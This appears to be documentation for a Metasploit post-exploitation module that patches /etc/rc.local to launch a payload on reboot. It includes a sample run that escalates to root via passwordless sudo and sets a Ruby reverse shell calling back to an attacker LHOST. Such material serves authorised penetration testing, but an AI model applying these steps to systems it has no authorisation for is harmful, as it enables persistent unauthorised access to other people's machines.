## rc.local Persistence

This module patches `/etc/rc.local` in order to launch a payload upon reboot.

> Sometimes `/etc/rc.local` is run when the network is not yet on, make sure your payload won't quit if that's the case.


### Verification

1. Exploit a box and get a **root** session (tip: try `post/multi/manage/sudo`)
2. `use exploit/linux/local/rc_local_persistence`
3. `set SESSION <session>`
4. `set PAYLOAD <payload>`
5. `set LHOST <lhost>`
6. `exploit`


### Sample run

#### Escalate the session if needed

```
msf5 exploit(linux/local/rc_local_persistence) > use post/multi/manage/sudo 
msf5 post(multi/manage/sudo) > set session 3
session => 3
msf5 post(multi/manage/sudo) > run

[*] SUDO: Attempting to upgrade to UID 0 via sudo
[*] No password available, trying a passwordless sudo.
[+] SUDO: Root shell secured.
[*] Post module execution completed
```

#### Persist

```
msf5 post(multi/manage/sudo) > use exploit/linux/local/rc_local_persistence
msf5 exploit(multi/handler) > set payload cmd/unix/reverse_ruby
payload => cmd/unix/reverse_ruby
msf5 exploit(linux/local/rc_local_persistence) > set LHOST 192.168.0.41
LHOST => 192.168.0.41
msf5 exploit(linux/local/rc_local_persistence) > run

[*] Reading /etc/rc.local
[*] Patching /etc/rc.local
```
